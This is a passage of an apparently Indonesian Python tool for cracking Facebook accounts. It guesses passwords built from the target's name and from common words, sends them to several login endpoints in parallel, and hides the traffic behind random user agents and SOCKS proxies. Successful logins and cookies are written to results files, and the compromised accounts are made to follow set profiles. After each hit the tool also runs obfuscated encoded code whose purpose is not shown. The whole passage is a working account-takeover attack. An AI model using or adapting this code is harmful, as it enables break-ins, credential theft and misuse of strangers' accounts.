#	DIBENNED SAMA MARK		r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100063690353340",cookies={"cookie":cokii}).text,"html.parser")
			r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100001316493597",cookies={"cookie":cokii}).text,"html.parser")
			get = r.find("a",string="Ikuti").get("href")
			sessionn.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cokii}).text
		except:
			try:
				r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100001316493597",cookies={"cookie":cokii}).text,"html.parser")
				get = r.find("a",string="Add Friend").get("href")
				sessionn.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cokii}).text
			except:
				try:
					r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100001316493597",cookies={"cookie":cokii}).text,"html.parser")
					get = r.find("a",string="Tambah Teman").get("href")
					sessionn.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cokii}).text
				except:pass
		try:
			puput = {'cookie':cokii}
			with requests.Session() as xyz:
				for x in par(xyz.get('https://mbasic.facebook.com/100063690353340',cookies=puput).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
		except:pass


	def otomatis(self):
		global anim,anim2
		anim = Progress(SpinnerColumn("arrow2"),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		anim2 = anim.add_task('',total=len(idd))
		kotak("# SEBELUM CRACK SILAHKAN JAWAB PERTANYANN DIBAWAH INI",I,Q)
		self.pilih_fps()
		if "fast" == fps:pass
#			self.buat_ugen()
#			self.pilih_mentod_()
		else:
			self.tanya_apk()
			self.tanya_opsi()
			self.tanya_prox_k()
			self.buat_ugen()
			self.pilih_url()
			self.pilih_mentod_()
		self.pas_me()
		iprint(Panel(f"{OO}JIGA TIDAK ADA HASIL, SILAHKAN HIDUP MATIKAN MODE PESAWAT{QQ}\n{II}RESULTS OK DISIMPAN KE : results/OK-{durasi}.txt\n{KK}RESULTS CP DISIMPAN KE : results/CP-{durasi}.txt{QQ}", style=Q, title="INFORMATION"))
		with anim:
			with __Kiky__(max_workers=35) as kontok:
				for kocok in id:
					try:
						idz = kocok.split('<=>')[0]
						pws = kocok.split('<=>')[1].lower()
						pws_ = kocok.split('<=>')[1]
						colmek = pws.split(' ')[0]
						colmek_ = pws_.split(' ')[0]
						pwe = []
						if len(colmek)<5:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")

								elif pass_ in ["04","4"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")
									pwe.append("pantek")
									pwe.append("indonesia")
									pwe.append("sayangku")
									pwe.append("123456")

								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)

								pwe.append(pws)
								pwe.append(pws_)
						else:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")

								elif pass_ in ["04","4"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")
									pwe.append("pantek")
									pwe.append("indonesia")
									pwe.append("sayangku")
									pwe.append("123456")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								pwe.append(pws_)
								pwe.append(pws)


						if "fast" == fps:
							kontok.submit(self.method_fast, idz, pwe)
						else:
							if "mobile" == url_met:
								kontok.submit(self.method, idz, pwe,"m.facebook.com")
							elif "free" == url_met:
								kontok.submit(self.method, idz, pwe,"free.facebook.com")
							elif "p" == url_met:
								kontok.submit(self.method, idz, pwe,"p.facebook.com")
							elif "x" == url_met:
								kontok.submit(self.method, idz, pwe,"x.facebook.com")
							elif "random" == url_met:
								link_ajg=random.choice(["mbasic","x","m","p","free"])
								kontok.submit(self.method, idz, pwe,link_ajg+".facebook.com")
							else:
								kontok.submit(self.method, idz, pwe,"mbasic.facebook.com")
#					except Exception as e:print(e)
					except:
						pass
		print()
		print()
		kotak("# CRACK SELESAI JANGAN LUPA, ISTIRAHAT", I, C)
		os.sys.exit()

	def u_a(self):
		rr = random.randint
		rc = random.choice
		aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
		aZ10 = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9','0']
		if "ke1" == method:
			#A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
			#B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
			#C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
#			A__ = f'Mozilla/5.0 (Linux; U; Android {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
			A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
#			A_ = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
			B_ = f'{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}'
#			B_ = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
			C_ = f'{str(rr(30,57))} Build/{B_}) AppleWebKit/537.36 (KHTML, like Gecko)'
			D_ = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
			E_ = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'

			ua = f'{A_}{C_}{D_}{E_}'
		elif "ke2" == method:
			babas = {
			    "1": f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; HP Slate 7 HD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,101))}.0.4044.138 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(30,109))}.02.1485.78487",
			    "2": f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; i-mobile i-TAB DTV Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,101))}.0.2311.111 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(30,109))}.02.1485.78487",
			    "3": f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}; HP Chromebook x360 11 G1 EE Build/{str(rc(aZ))}{str(rr(11,99))}-{str(rr(11111,99999))}.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,100))}.0.4389.105 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(30,109))}.02.1485.78487",
			    "4": f"Mozilla/5.0 (Linux; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; NEO-{str(rc(['X7-216A','X5-116A','U9-H']))} Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,100))}.0.1916.138 Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser','YaSearchBrowser']))}/{str(rr(20,50))}.0.1485.78487",
			    "5": f"Mozilla/5.0 (Linux; Android {str(rr(5,12))}; {str(rc(['RMX1809',f'Redmi Note {str(rr(6,10))}','CPH1809','SM-N915G','V2123A']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,101))}.0.4664.104 Mobile Safari/537.36 {str(rc(['OculusBrowser','SamsungBrowser']))}/3/32.9920.72",
			}
			ua = babas[str(rr(1,5))]
		return ua
	def prox_(self):
		prox = open("data/prox_socks5.txt","r").read().splitlines()
		proxx = open("data/prox_socks4.txt","r").read().splitlines()
		if "ke1" == method:
			return {"http": f"socks5://{random.choice(prox)}"}
#			return {"http": f"socks4://{random.choice(proxx)}"}
		elif "ke2" == method:
#			return {"http": f"socks5://{random.choice(prox)}"}
			return {"http": f"socks4://{random.choice(proxx)}"}

	def method(self, user, memek,url):
		global ok,cp,loop
		session = requests.Session()
		ua      = self.u_a()
		proxy   = self.prox_()
		try:
			loop += 1
			for pw in memek:
				if "ke1" == method:
					link = session.get(f"https://{url}/login/?source=auth_switcher")
					date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":user,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
					head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','Host': url,'origin': 'https://'+url,'referer': 'https://'+url+'/login/?source=auth_switcher','user-agent': ua,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-requested-with': 'XMLHttpRequest'}
					if prox_k == "Risky_Ganteng":
						bx = session.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100'+yyy, headers=head, data=date, proxies=proxy)
					else:
						bx = session.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100'+yyy, headers=head, data=date)

				elif "ke2" == method:
					session.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
					link = session.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
					date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
					head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
					bz = session.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
				if 'c_user'+yyy in session.cookies.get_dict():
					play_mpv(".Wiii.mp3");print(url);print(ua)
					try:
						# Info: coding *GET INGFO UA* buatan anggaxd
						url_main = "https://www.whatsmyua.info"
						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
						raw_ua = s.find("li", id="rawUa").text
						family = s.find("li", id="family").text
						name_hp = s.find("li", id="product").text
						os_ = s.find("li", id="os").text
						ly = s.find("li", id="layout").text
						ua = raw_ua.replace("rawUa: ", "")
						browser = family.replace("family: ", "")
						hp = name_hp.replace("product: ", "")
						os = os_.replace("os: ", "")
						layout = ly.replace("layout: ", "")
					except:pass
					coki = ubah_cok(session.cookies.get_dict());user = re.findall('c_user=(.*);xs', coki)[0];wrt = '%s|%s|%s' % (user,pw,coki);_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(ua09[2]));ok.append(wrt);open('results/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" in apk_me:
						ubah_bahasa(coki)
						get_apk(user,pw,coki)
					else:
						try:
							ok_ = Tree("                                 ",highlight=True, hide_root=True)
							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
							ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
							ok___ = ok__.add(f"{b}COOKIES{q}")
							ok___.add(f"{c}{coki}{q}")
							ok___ = ok__.add(f"{k}Link App{q}")
							ok____= ok___.add(f"{c}{link_app}{q}")
							ok___ = ok__.add(f"{k}UserAgent{q}")
							ok____= ok___.add(f"{c}{ua}{q}")
							ok_____= ok____.add(f"{k}Information UserAgent{q}")
							ok______= ok_____.add(f"{b}OS{q}")
							ok______.add(f"{c}{os}{q}")
							ok______= ok_____.add(f"{b}LAYOUT{q}")
							ok______.add(f"{c}{layout}{q}")
							ok______= ok_____.add(f"{b}DEVICE HP{q}")
							ok______.add(f"{c}{hp}{q}")
							ok______= ok_____.add(f"{b}Jenis Browser{q}")
							ok______.add(f"{c}{browser}{q}")
							prints(ok__)
						except:
							ok_ = Tree("                                 ",highlight=True, hide_root=True)
							ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
							ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
							ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
							ok___ = ok__.add(f"{b}COOKIES{q}")
							ok___.add(f"{c}{coki}{q}")
							ok___ = ok__.add(f"{k}UserAgent{q}")
							ok___.add(f"{c}{ua}{q}")
							prints(ok__)
					self.Kontol_Kau_Ikuti(session,coki)
					break
				elif 'checkpoint'+yyy in session.cookies.get_dict():
					play_mpv(".Wiii.mp3");print(url)
					try:
						# Info: coding *GET INGFO UA* buatan anggaxd
						url_main = "https://www.whatsmyua.info"
						s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
						raw_ua = s.find("li", id="rawUa").text
						family = s.find("li", id="family").text
						name_hp = s.find("li", id="product").text
						os_ = s.find("li", id="os").text
						ly = s.find("li", id="layout").text
						ua = raw_ua.replace("rawUa: ", "")
						browser = family.replace("family: ", "")
						hp = name_hp.replace("product: ", "")
						os = os_.replace("os: ", "")
						layout = ly.replace("layout: ", "")
					except:pass
					try:
						yz  = requests.Session().get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,tiktok),cookies=puput)
						zxc = json.loads(yz.text)
						cp_ttl= zxc['birthday']
						month, day, year = cp_ttl.split('/')
						month = bulan_ttl[month]
						ttl = f"{day}-{month}-{year}"
					except:
						ttl="—"
					wrt = '%s|%s|%s' % (user,pw,ttl);cp.append(wrt);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]));open('results/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
					if "IYA" == opsi_y:
						try:
							hide_opsi(user,pw,ttl)
						except:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							prints(cp__)
					else:
						try:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							cp___ = cp__.add(f"{k}UserAgent{q}")
							cp____= cp___.add(f"{c}{ua}{q}")
							cp_____= cp____.add(f"{k}Information UserAgent{q}")
							cp______= cp_____.add(f"{b}OS{q}")
							cp______.add(f"{c}{os}{q}")
							cp______= cp_____.add(f"{b}LAYOUT{q}")
							cp______.add(f"{c}{layout}{q}")
							cp______= cp_____.add(f"{b}DEVICE HP{q}")
							cp______.add(f"{c}{hp}{q}")
							cp______= cp_____.add(f"{b}Jenis Browser{q}")
							cp______.add(f"{c}{browser}{q}")
							prints(cp__)
						except:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							cp___ = cp__.add(f"{k}UserAgent{q}")
							cp___.add(f"{c}{ua}{q}")
							prints(cp__)
					break
				else:continue
			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
			anim.advance(anim2)
#		except Exception as e:print(e)
		except:
			loop-=1
			self.method(user, memek,url)
	def buat_ugen(self):
		global ugen_
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"UserAgent Bawaan\nManual")
		sol().print(tod, justify='center')

		pilih_ = input(f">--Pilih 1-5--> {q}")
		if pilih_ in ("1","01"):pass
		elif pilih_ in ("2","02"):
			try:
				jmlh = int(input(f">--Jumlah UserAgent--> "))
			except:jmlh=1
			for x in range(jmlh):
				ues=input('>--Masukan UserAgent--> ')
				if ues == '':
					kotak("# JANGAN KOSONG KONTOL",M,Q)
					time.sleep(5);self.buat_ugen()
				elif len(ues)<=34:
					kotak("# MINIMAL USERAGENT 35 KATA",M,Q)
					time.sleep(5);self.buat_ugen()
				else:
					ugen_.append(ues)
		else:
			kotak("# MAAF PILIHAN ANDA TIDAK DITEMUKAN",M,Q)
			self.buat_ugen()


	def pilih_url(self):
		global url_met
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5",f"Mobile {QQ}[{II}Recommended{QQ}]{CC}\nFree\nMbasic\nP\nX")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			url_met = "mobile"
		elif hu in ['2','02']:
			url_met = "free"
		elif hu in ['3','03']:
			url_met = "mbasic"
		elif hu in ['4','04']:
			url_met = "p"
		elif hu in ['5','05']:
			url_met = "x"
		elif hu in ['6','06']:
			url_met = "random"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-4 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_url()
	def pilih_mentod_(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-2{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-2 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_mentod_()
#		method = "ke1"

	def pilih_mentod(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
#		elif hu in ['3','03']:
#			method = "ke3"
#			self.pilih_next()
#		elif hu in ['4','04']:
#			method = "ke4"
#		elif hu in ['5','05']:
#			method = "ke5"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-5 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_mentod()


	def pilih_next(self):
		global link_app
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5\n6\n7",f"Free Fire\nHago\nRuang Guru\nBryanly\nHings Domino\nYandex\nAll Link(Random)")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			#boyaah
			link_app=["https://auth.booyah.live/oauth/login?client_id=10058&redirect_uri=https%3A%2F%2Fbooyah.live%2Flogin&response_type=token&platform=3&locale=en-GB&state=return_url%3Dhttps%3A%2F%2Fbooyah.live%2F"]
		elif hu in ['2','02']:
			#Hago
			link_app=["https://m.facebook.com/v3.2/dialog/oauth?app_id=1443497502442589&cbt=1660006184043&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df22524a9ae24e8c%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener&client_id=1443497502442589&display=touch&domain=www.ihago.net&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.ihago.net%2Fa%2Fweb-login%2Findex.html%23%2F&locale=en_US&logger_id=f4075c8fa8864&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df591a111651cc%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener%26frame%3Dff067454e6509c&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v3.2"]
		elif hu in ['3','03']:
			#Ruang Guru
			link_app=["https://m.facebook.com/v3.3/dialog/oauth?encrypted_query_string=AeDT2UXYR_53fiXztzu_JhFEBFfSJQgdUJGUXpWNi06kMvyZabZnxfdBZhZqn0UVav0tMQhs1d-jJsCtyUwNApPh-rjYgugWqF-e66qARB91xP624bvOxSjswdmzxS1zgvH4Ojj2MOEEW-Qi3bMycxfp8etyXlIdau3ppuAyyDbEBSIyiWvpC8Fl0k72v7CPgmvEGr6EvqJJ3P96Cmtf4nAFS8qWpLS3hwVpvr-cYADOlLya0mpQybTQ47egOAscvQV6EJZGU0gf4ptTfXhpcIb_ZLZh0gOKDftQzztpwa5jzDXQyiMFC94hijWNafrhSEZ8WtfinBYZkUVU4hbjM6CDzdO14HDUlHa-_QU3aQQo-V1wpnndx0cE1pNbOSuLpyW0E6q5MJ8qRZ7J2uX4PcmjsOBHRfOWA1hsBPQrHPnWoVidw8Lk67C4b9ult5CY578K5fHL447X3Wjq3jXxdSCEPNL-MLpW0bsjPM3-cNC1X9oYB6AjxpToI6zqS5ML-eRsA5VVeB89eS2X4xxcgveP2oOnFWUMyqQS7Ma1guZvlRvCc9rK7elLXdljMd743YV6RJLg7l_wGelvrdbGJAClrZQN2NPuvxLfUyOwIblHTTZ21mA8diwCfRFkmwbbg30y9ry6wN39pTXZdZlGEuoQezQO1qgJD845j2oGD057s9p3S-p10ljHw-eYOvx8u6gMFdWPmbmKIF6KKkJhdzwGh1JDoWRjmxvcXiZal1VM4S8ZE99uIM54eNlpB0wxcVVJZ92j72g4mc_75e1fEfhQw1ZSPlrfq4Auc3bYQFMZ7x87n8_Buv_V-33jSjl0XyXNUk9UQlRVLztDgihIRspczT94fGzhzksV0ASf0a9pyaYTrbsHjK_o7tGxLtCqneuiooMwvds0VB9BgpwlwhVMmotgV881fyZ-9Ge_CAYXenAoGUJMufxZ-P5FGIpWRy5XmJ6ZiE9KsnV2m2W11ZUDYozAHF_aiVjT3AxhN9tAyKv4shU0ChnURw